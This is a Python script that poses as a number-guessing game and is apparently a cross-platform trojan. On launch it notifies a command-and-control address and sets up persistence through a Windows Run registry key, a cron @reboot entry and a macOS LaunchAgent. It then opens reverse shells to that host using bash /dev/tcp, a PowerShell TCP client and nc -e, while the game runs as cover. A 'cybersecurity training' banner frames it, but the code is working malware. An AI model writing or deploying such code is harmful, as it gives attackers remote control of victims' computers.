#!/usr/bin/env python3
import os
import sys
import subprocess
import socket
import threading
import time
import random
import platform
import urllib.request
from pathlib import Path

# C2 CONFIG
LHOST = "10.12.72.174"
LPORT = 4444
SESSION_ID = f"{platform.node()}_{int(time.time())}"

class UniversalC2Game:
    def __init__(self):
        self.secret = random.randint(1, 100)
        self.running = True
        self.os = self.detect_os()
        self.session_id = SESSION_ID

    def detect_os(self):
        sys_name = platform.system().lower()
        if 'android' in sys_name or 'linux' in sys_name:
            return 'linux'
        elif 'windows' in sys_name:
            return 'windows'
        elif 'darwin' in sys_name:
            return 'macos'
        else:
            return 'unknown'

    def notify_c2(self, message):
        """Send session notification to C2"""
        try:
            s = socket.socket()
            s.connect((LHOST, 4445))  # Notification port
            s.send(f"NEW_SESSION:{self.session_id}:{self.os}:{platform.node()}:{message}".encode())
            s.close()
        except:
            pass

    def get_shell(self):
        """OS-specific reverse shells"""
        shells = {
            'linux': '''bash -i >& /dev/tcp/{}/{} 0>&1'''.format(LHOST, LPORT),
            'windows': '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'''.format(LHOST, LPORT),
            'macos': '''bash -i >& /dev/tcp/{}/{} 0>&1'''.format(LHOST, LPORT),
            'unknown': 'nc {} {} -e /bin/sh'.format(LHOST, LPORT)
        }
        return shells.get(self.os, shells['unknown'])

    def deploy_shell(self):
        """Execute OS-native reverse shell"""
        shell_cmd = self.get_shell()
        self.notify_c2(f"SHELL_DEPLOYED:{self.os}")

        if self.os == 'windows':
            os.system(shell_cmd)
        else:
            subprocess.Popen(shell_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def ensure_persistence(self):
        """Multi-OS persistence"""
        game_path = os.path.abspath(sys.argv[0])

        if self.os == 'windows':
            reg = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Game /t REG_SZ /d "{sys.executable} \\"{game_path}\\"" /f'
            os.system(reg)
        elif self.os == 'linux':
            cron = f"@reboot {sys.executable} {game_path} >/dev/null 2>&1\n"
            try:
                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                current = result.stdout if result.returncode == 0 else ""
                if cron.strip() not in current:
                    new_cron = current + cron
                    subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True).communicate(input=new_cron)
            except: pass
        elif self.os == 'macos':
            launchd = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.game.persistence</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{game_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>'''
            Path('~/Library/LaunchAgents/com.game.plist').expanduser().write_text(launchd)
            os.system('launchctl load ~/Library/LaunchAgents/com.game.plist')

    def game_loop(self):
        clear = "cls" if self.os == 'windows' else "clear"
        os.system(clear)
        print(f"🎮 UNIVERSAL GUESSING GAME v2.0 ({self.os.upper()}) 🎮")
        print("Guess 1-100! Have fun! 😄")

        while self.running:
            try:
                guess = input("\nYour guess: ").strip()
                self.attempts += 1
                if guess.isdigit():
                    g = int(guess)
                    if g == self.secret:
                        print(f"🎉 AMAZING! Solved in {self.attempts} tries!")
                        input("Press Enter to quit...")
                        break
                    print("Higher!" if g < self.secret else "Lower!")
            except: pass

    def main(self):
        print(f"🚀 Detected: {self.os.upper()} - {platform.node()}")
        print("⚠️  CYBERSECURITY TRAINING - Press Enter...")
        input()

        self.notify_c2("GAME_STARTED")
        self.ensure_persistence()
        self.notify_c2("PERSISTENCE_SET")

        # Deploy shell immediately
        shell_thread = threading.Thread(target=self.deploy_shell, daemon=True)
        shell_thread.start()

        self.game_loop()

if __name__ == "__main__":
    UniversalC2Game().main()
    # sdifhkd
